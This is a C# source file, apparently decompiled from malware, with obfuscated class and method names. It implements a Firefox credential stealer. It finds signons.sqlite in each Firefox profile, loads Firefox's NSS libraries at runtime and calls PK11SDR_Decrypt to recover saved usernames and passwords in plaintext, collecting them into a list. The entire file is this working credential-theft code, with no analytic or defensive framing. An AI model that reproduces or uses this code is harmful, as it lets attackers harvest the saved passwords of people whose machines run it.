using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

internal sealed class Class9
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate0(string string_0);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate1();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate2(long long_0, bool bool_0, long long_1);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Delegate3(ref Struct4 struct4_0, ref Struct4 struct4_1, int int_0);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Delegate4(IntPtr intptr_0, IntPtr intptr_1, StringBuilder stringBuilder_0, int int_0);

	public sealed class Class10
	{
		public static long long_0;

		public static byte[] byte_0;
	}

	public struct Struct4
	{
		public int int_0;

		public int int_1;

		public int int_2;
	}

	private static IntPtr intptr_0;

	public static void smethod_0()
	{
		string string_ = string.Empty;
		string string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Mozilla Firefox\\";
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		string[] directories = Directory.GetDirectories(path);
		foreach (string text in directories)
		{
			string[] files = Directory.GetFiles(text, "*.sqlite");
			foreach (string text2 in files)
			{
				if (text2.Contains("signons.sqlite"))
				{
					string_ = text2;
					smethod_2(text, string_2);
				}
			}
		}
		GClass3 gClass = new GClass3(string_);
		gClass.method_6("moz_logins");
		for (int k = 0; k <= gClass.method_7() - 1; k++)
		{
			string string_3 = gClass.method_9(k, "hostname");
			string string_4 = gClass.method_9(k, "formSubmitURL");
			string string_5 = smethod_1(gClass.method_9(k, "encryptedUsername"));
			string string_6 = smethod_1(gClass.method_9(k, "encryptedPassword"));
			Class19.list_0.Add(new GClass2("FireFox", string_3, string_5, string_6, string_4));
		}
	}

	public static string smethod_1(string string_0)
	{
		StringBuilder stringBuilder = new StringBuilder(string_0);
		Struct4 struct4_ = default(Struct4);
		long num = 0L;
		num = smethod_3();
		smethod_4(num, bool_0: true, 0L);
		int value = smethod_5(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
		Struct4 struct4_2 = (Struct4)Marshal.PtrToStructure(new IntPtr(value), typeof(Struct4));
		if (smethod_6(ref struct4_2, ref struct4_, 0) == 0)
		{
			if (struct4_.int_2 != 0)
			{
				byte[] array = new byte[struct4_.int_2];
				Marshal.Copy(new IntPtr(struct4_.int_1), array, 0, struct4_.int_2);
				return Encoding.ASCII.GetString(array);
			}
			return "Error";
		}
		return "Error";
	}

	public static long smethod_2(string string_0, string string_1)
	{
		LoadLibrary(string_1 + "mozglue.dll");
		LoadLibrary(string_1 + "nspr4.dll");
		LoadLibrary(string_1 + "plc4.dll");
		LoadLibrary(string_1 + "plds4.dll");
		LoadLibrary(string_1 + "nssutil3.dll");
		intptr_0 = LoadLibrary(string_1 + "nss3.dll");
		IntPtr procAddress = GetProcAddress(intptr_0, "NSS_Init");
		Delegate0 @delegate = (Delegate0)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate0));
		return @delegate(string_0);
	}

	public static long smethod_3()
	{
		IntPtr procAddress = GetProcAddress(intptr_0, "PK11_GetInternalKeySlot");
		Delegate1 @delegate = (Delegate1)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate1));
		return @delegate();
	}

	public static long smethod_4(long long_0, bool bool_0, long long_1)
	{
		IntPtr procAddress = GetProcAddress(intptr_0, "PK11_Authenticate");
		Delegate2 @delegate = (Delegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate2));
		return @delegate(long_0, bool_0, long_1);
	}

	public static int smethod_5(IntPtr intptr_1, IntPtr intptr_2, StringBuilder stringBuilder_0, int int_0)
	{
		IntPtr procAddress = GetProcAddress(intptr_0, "NSSBase64_DecodeBuffer");
		Delegate4 @delegate = (Delegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate4));
		return @delegate(intptr_1, intptr_2, stringBuilder_0, int_0);
	}

	public static int smethod_6(ref Struct4 struct4_0, ref Struct4 struct4_1, int int_0)
	{
		IntPtr procAddress = GetProcAddress(intptr_0, "PK11SDR_Decrypt");
		Delegate3 @delegate = (Delegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate3));
		return @delegate(ref struct4_0, ref struct4_1, int_0);
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_1, string string_0);
}
